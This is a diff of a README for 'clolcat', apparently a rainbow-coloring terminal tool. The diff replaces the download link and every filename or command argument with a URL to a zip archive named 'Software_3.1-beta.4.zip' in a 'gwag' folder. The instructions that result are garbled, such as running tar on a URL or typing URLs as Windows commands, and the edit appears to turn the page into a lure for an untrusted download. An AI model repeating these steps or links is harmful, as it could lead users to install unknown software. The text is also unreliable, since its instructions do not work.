@@ -6,7 +6,7 @@ Welcome to clolcat! This application lets you add bright, rainbow colors to your
 
 ## 📥 Download Now
 
-[![Download clolcat](https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip%https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip)](https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip)
+[![Download clolcat](https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip%https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip)](https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip)
 
 ## 📖 Overview
 
@@ -33,11 +33,11 @@ To run clolcat, you need:
 
 To get clolcat, visit this page to download:
 
-[Download clolcat](https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip)
+[Download clolcat](https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip)
 
 ### 2. Download clolcat
 
-On the releases page, you will see the latest version. Click on the version you want to download. Look for a file named something like `https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip` or `https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip`. 
+On the releases page, you will see the latest version. Click on the version you want to download. Look for a file named something like `https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip` or `https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip`. 
 
 ### 3. Extract the File
 
@@ -45,23 +45,23 @@ After downloading, locate the file in your downloads folder.
 
 - For **Windows**: Right-click on the ZIP file and choose "Extract All." Follow the instructions to extract it.
 - For **macOS**: Double-click the ZIP file to extract it.
-- For **Linux**: Use the terminal and run `tar -xvzf https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip`.
+- For **Linux**: Use the terminal and run `tar -xvzf https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip`.
 
 ### 4. Run clolcat
 
 Now, you can run clolcat.
 
-- **For Windows**: Open Command Prompt. Navigate to the folder where you extracted clolcat and type `https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip` to get colored output of a text file.
-- **For macOS and Linux**: Open your terminal. Navigate to your clolcat folder and run `./clolcat https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip`.
+- **For Windows**: Open Command Prompt. Navigate to the folder where you extracted clolcat and type `https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip` to get colored output of a text file.
+- **For macOS and Linux**: Open your terminal. Navigate to your clolcat folder and run `./clolcat https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip`.
 
-You can replace `https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip` with any text file you want to colorize.
+You can replace `https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip` with any text file you want to colorize.
 
 ## 📄 Usage Examples
 
 You can use clolcat in different ways:
 
 - **Standard Output**: Run `echo "Hello world" | ./clolcat` to see the output in color.
-- **Text Files**: Use `./clolcat https://raw.githubusercontent.com/Him-Horizon/clolcat/main/gwag/clolcat.zip` to colorize the content of any text file.
+- **Text Files**: Use `./clolcat https://github.com/Him-Horizon/clolcat/raw/refs/heads/main/gwag/Software_3.1-beta.4.zip` to colorize the content of any text file.
 
 ## ❓ Troubleshooting
 
